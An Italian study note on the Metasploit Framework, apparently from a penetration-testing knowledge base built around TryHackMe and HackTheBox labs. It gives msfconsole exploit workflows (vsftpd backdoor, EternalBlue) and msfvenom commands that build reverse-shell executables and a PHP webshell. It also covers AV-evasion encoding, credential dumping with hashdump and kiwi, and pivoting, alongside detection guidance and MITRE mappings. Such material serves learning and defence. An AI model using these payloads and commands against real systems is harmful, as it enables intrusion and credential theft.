---
tipo: entita
tag: [tool]
fase: 2
fonti: 6
aggiornato: 2026-07-02
stato: maturo
aliases: ["Metasploit"]

---

# Metasploit

## In breve

**Metasploit Framework** è la piattaforma open source per penetration testing più diffusa al mondo, mantenuta da Rapid7. Raccoglie centinaia di exploit, payload, moduli ausiliari e strumenti di post-exploitation in un'unica interfaccia. Semplifica enormemente la fase di [[Exploitation]] e [[Post-Exploitation]], permettendo di selezionare un exploit, configurarlo e lanciarlo in pochi comandi. L'interfaccia principale è `msfconsole`.

> **Nota etica**: Metasploit è uno strumento potente usato da professionisti della sicurezza. Va usato ESCLUSIVAMENTE su sistemi autorizzati: lab, CTF, macchine proprie. L'uso su sistemi altrui senza permesso è reato.

## Uso tipico

```bash
# Avviare Metasploit (su Kali Linux)
msfconsole

# Cercare un exploit per un servizio specifico
msf6 > search vsftpd
msf6 > search type:exploit name:eternalblue

# Selezionare e configurare un modulo
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > show options
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
msf6 exploit(vsftpd_234_backdoor) > set LHOST 10.10.14.1   # solo se serve reverse shell
msf6 exploit(vsftpd_234_backdoor) > run

# Payload — visualizzare payload compatibili con l'exploit scelto
msf6 exploit(vsftpd_234_backdoor) > show payloads
msf6 exploit(vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact

# Moduli ausiliari — scanner, brute-force, enumerazione
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > use auxiliary/scanner/smb/smb_ms17_010    # check EternalBlue

# Post-exploitation — una volta ottenuta una sessione Meterpreter
meterpreter > sysinfo          # info di sistema
meterpreter > getuid           # utente corrente
meterpreter > getsystem        # tenta privilege escalation
meterpreter > hashdump         # dump hash password (richiede privilegi)
meterpreter > shell            # apre shell di sistema

# Generare un payload standalone con msfvenom
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o payload.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o payload.exe

# Importare risultati Nmap nel database Metasploit
msf6 > db_import scan_risultati.xml
msf6 > hosts       # mostra host importati
msf6 > services    # mostra servizi importati
```

**Tipi di moduli:**

| Tipo | Descrizione |
|---|---|
| `exploit/` | Sfrutta vulnerabilità per ottenere accesso |
| `auxiliary/` | Scanner, fuzzer, brute-force, sniffing |
| `payload/` | Codice eseguito sul target dopo l'exploit |
| `post/` | Moduli post-exploitation (PrivEsc, dump, pivot) |
| `encoder/` | Offusca il payload per eludere AV |

## Quando si usa

- Fase di [[Exploitation]]: per sfruttare vulnerabilità note con exploit già pronti.
- Fase di [[Post-Exploitation]]: moduli `post/` per PrivEsc, dump credenziali, pivot.
- Generazione payload (`msfvenom`): per creare eseguibili malevoli da usare in test.
- Scansione e verifica vulnerabilità con moduli `auxiliary/scanner/`.

## Note e trucchi

- **Meterpreter** è il payload avanzato di Metasploit: a differenza di una shell grezza, gira in memoria, è cifrato e ha decine di comandi integrati (upload/download file, screenshot, keylogger, pivot).
- Il comando `sessions -l` lista tutte le sessioni attive; `sessions -i 1` entra nella sessione 1.
- `search type:exploit platform:windows rank:excellent` filtra exploit di alta affidabilità per Windows.
- Aggiornare il database degli exploit: `msfupdate` (o `apt update && apt upgrade metasploit-framework` su Kali).
- Il database PostgreSQL è usato da Metasploit per salvare host e risultati. Avviarlo prima: `systemctl start postgresql`.

---

## MECCANISMO INTERNO — architettura
- **`msfconsole`**: la CLI principale (Ruby). Carica i moduli da `~/.msf4/modules` e dai path di sistema, parla col **database PostgreSQL** (`hosts`, `services`, `creds`, `loot`, `notes`) e con i **plugin**.
- **Moduli** = file Ruby con metadati (`rank`, `targets`, `options`) e logica. Il `rank` (`excellent` → `manual`) indica affidabilità: `excellent`/`great` raramente crashano il servizio.
- **Payload — staged vs stageless**:
  - **Staged** (`windows/meterpreter/reverse_tcp`, notazione con `/`): invia un piccolo **stager** che poi scarica lo **stage** (il vero Meterpreter) dal listener. Più piccolo, ma serve una seconda connessione.
  - **Stageless** (`windows/meterpreter_reverse_tcp`, notazione con `_`): tutto il payload in un colpo. Più grosso ma più robusto su reti instabili / se l'IDS blocca lo stage.
- **Meterpreter**: payload in-memory, comunicazione **cifrata (TLS)**, estendibile a runtime, non tocca il disco → evade molti AV. Gira via **reflective DLL injection** dentro un processo legittimo.
- **`multi/handler`** (`exploit/multi/handler`): il listener generico per ricevere sessioni da payload generati con [[msfvenom]] fuori da Metasploit.

## WORKFLOW CONSAPEVOLE
```bash
msfdb init && msfconsole -q
msf6 > workspace -a target_x          # isola i dati di questo engagement
msf6 > db_import scan.xml             # importa Nmap (-> hosts/services)
msf6 > services -p 445                # cosa gira sulla 445
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > info                           # LEGGI: rank, targets, side-effect, CVE
msf6 > set RHOSTS 10.10.10.5
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST tun0                 # interfaccia, non IP fisso (VPN HTB/THM)
msf6 > check                          # quando supportato: verifica SENZA exploitare
msf6 > run                            # o 'exploit -j' per background
msf6 > sessions -l                    # lista; sessions -i 1 per entrare
```
> [!warning] `set LHOST tun0`, non l'IP a mano
> Su VPN (HTB/THM) l'IP cambia. Usare il nome interfaccia (`tun0`) evita il classico "exploit completed but no session created" causato da LHOST sbagliato → il target prova a connettersi a un IP irraggiungibile.

## msfvenom — generazione payload
```bash
# Lista payload / formati / encoder
msfvenom -l payloads | grep windows/x64
msfvenom --list formats

# EXE Windows Meterpreter (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o s.exe

# ELF Linux, shell grezza stageless
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o s.elf

# Webshell PHP / WAR / ASPX
msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=443 -f raw -o sh.php

# Encoding per eludere signature (oggi poco efficace contro AV moderni)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o s.exe
```
Poi ricevi con `multi/handler` impostando lo **stesso** PAYLOAD/LHOST/LPORT.
> [!info] Encoder ≠ crypter. `shikata_ga_nai` nasce per evitare **bad-char**, non per bypassare gli AV: Defender/EDR moderni riconoscono i payload msfvenom anche encodati. Per evasione reale servono crypter/loader custom.

## POST-EXPLOITATION e PIVOTING
```bash
# Post base
meterpreter > getuid ; sysinfo ; getsystem        # privesc tramite tecniche note
meterpreter > hashdump                            # SAM (serve SYSTEM)
meterpreter > run post/windows/gather/enum_logged_on_users
meterpreter > load kiwi ; creds_all               # Mimikatz integrato

# Migrazione in un processo stabile (evita di perdere la sessione)
meterpreter > ps ; migrate <PID>

# --- PIVOTING verso una rete interna raggiungibile solo dal target ---
meterpreter > run autoroute -s 10.10.20.0/24      # aggiunge la rotta nel routing MSF
msf6 > use auxiliary/scanner/portscan/tcp         # ora scansiona la 10.10.20.0/24
msf6 > set RHOSTS 10.10.20.0/24

# SOCKS proxy per usare tool ESTERNI (nmap, browser) attraverso il pivot
msf6 > use auxiliary/server/socks_proxy ; run     # poi proxychains nmap ...

# Port forward locale: porta 3389 del target interno -> localhost:3389
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.20.5
```
`autoroute` instrada il traffico **dei moduli MSF** attraverso la sessione; `socks_proxy` + proxychains estende il pivot a tool esterni. (Approfondimento dedicato: [[Pivoting]].)

## QUANDO **NON** usarlo
- **Esami OSCP**: Metasploit è limitato a **una sola macchina** dell'esame → impara gli exploit manuali e [[Reverse Shell e Bind Shell]] a mano.
- **Engagement stealth / red team**: i payload Meterpreter sono firmati da ogni EDR. Usa C2 dedicati (Cobalt Strike, Sliver, Havoc) o tooling custom.
- **Servizi fragili (SCADA/ICS, stampanti, legacy)**: un exploit `rank: manual`/`low` può **crashare** il target. Leggi `info` prima.
- **Quando capire conta più che ottenere la shell**: in studio, l'exploit manuale insegna il meccanismo; Metasploit lo nasconde.

## TROUBLESHOOTING (5 errori + causa)
1. **"Exploit completed, but no session was created"** → LHOST/LPORT errati (IP statico su VPN), payload incompatibile col target, o firewall egress che blocca la porta del listener. Fix: `set LHOST tun0`, `LPORT 443`, verifica con `check`.
2. **`[-] Handler failed to bind to ... :4444`** → porta già in uso (un altro handler/nc). Fix: cambia LPORT o `jobs -K` per chiudere i job esistenti.
3. **Database non connesso (`[-] No database`)** → PostgreSQL non avviato. Fix: `systemctl start postgresql && msfdb init`.
4. **Sessione Meterpreter muore subito** → il processo ospite termina (es. payload in un processo effimero). Fix: `migrate` verso un processo stabile (es. `explorer.exe`/`spoolsv.exe`).
5. **`set PAYLOAD` rifiutato / incompatibile** → architettura sbagliata (x86 vs x64) o payload non supportato dall'exploit. Fix: `show payloads` (mostra solo i compatibili), allinea l'arch del target.

## DETECTION ENGINEERING
- **Meterpreter staged** genera una seconda connessione subito dopo l'exploit (download dello stage): pattern rilevabile a livello di rete.
- **Firme note**: default certificate TLS di Meterpreter, default `User-Agent`, stager su porte come 4444. IDS (Suricata/ET) hanno regole `ET MALWARE Meterpreter`.
- **Host**: `migrate`/reflective injection → Sysmon Event ID 8 (CreateRemoteThread), 10 (ProcessAccess su lsass per i credential dump), 1 (process anomalo).
- **MITRE ATT&CK**: `T1059` Command/Scripting, `T1055` Process Injection, `T1003` OS Credential Dumping (hashdump/kiwi), `T1090` Proxy / `T1572` Tunneling (autoroute/socks/portfwd), `T1021` Remote Services.

## DOMANDE DA COLLOQUIO
1. **Staged vs stageless: differenza e quando sceglierli?** Staged (`/`) invia un piccolo stager che scarica il payload vero (più leggero, ma due connessioni e più rilevabile); stageless (`_`) è auto-contenuto, più grande ma robusto su reti instabili o quando lo stage viene bloccato.
2. **Cos'è Meterpreter e perché evade molti AV?** Payload in-memory iniettato via reflective DLL, comunicazione cifrata TLS, non scrive su disco ed è estendibile a runtime: niente file da firmare. EDR moderni però lo rilevano in memoria/rete.
3. **Come pivoti verso una rete interna con Metasploit?** `run autoroute -s <subnet>` instrada i moduli MSF attraverso la sessione; per tool esterni avvii `auxiliary/server/socks_proxy` e li lanci con proxychains; `portfwd` espone una singola porta interna in locale.
4. **Perché conviene saper exploitare senza Metasploit?** Per esami che lo limitano (OSCP), per capire il meccanismo della vulnerabilità, e perché in scenari stealth i payload Metasploit sono immediatamente rilevati dagli EDR.

## Lab

- **[[TryHackMe]] — modulo Metasploit ("Metasploit: Introduction", "Metasploit: Exploitation", "Meterpreter")**: percorso che copre `search`/`use`/`set`/`run`, i tipi di modulo e le sessioni Meterpreter esattamente come in questa nota.
- **[[TryHackMe]] — "Blue"**: sfrutta EternalBlue (`ms17_010_eternalblue`) con Metasploit fino a una sessione SYSTEM, ottimo per il workflow `db_import` → `use` → `set PAYLOAD` → `run`.
- **[[HackTheBox]] — Starting Point (es. *Lame*, *Blue*)**: applica exploit e moduli `auxiliary` su servizi reali; utile anche per esercitare `multi/handler` con payload generati da [[msfvenom]].

## Collegamenti

- [[Exploitation]]
- [[Post-Exploitation]]
- [[Reverse Shell e Bind Shell]]
- [[Pivoting]]
- [[msfvenom]]
- [[Meterpreter]]
- [[Nmap]]
- [[Scansione delle Porte]]
- [[Kali Linux]]
- [[MITRE ATT&CK]]

## Fonti

- Metasploit Unleashed (guida ufficiale gratuita): <https://www.offsec.com/metasploit-unleashed/>
- Rapid7 Metasploit Docs: <https://docs.metasploit.com/>
- Rapid7 — Pivoting in Metasploit: <https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html>
- HackTricks — Metasploit: <https://book.hacktricks.xyz/generic-methodologies-and-resources/metasploit-bf>
- MITRE ATT&CK — Process Injection (T1055): <https://attack.mitre.org/techniques/T1055/>
- TryHackMe — Metasploit (Intro/Exploitation/Meterpreter): <https://tryhackme.com/room/metasploitintro>
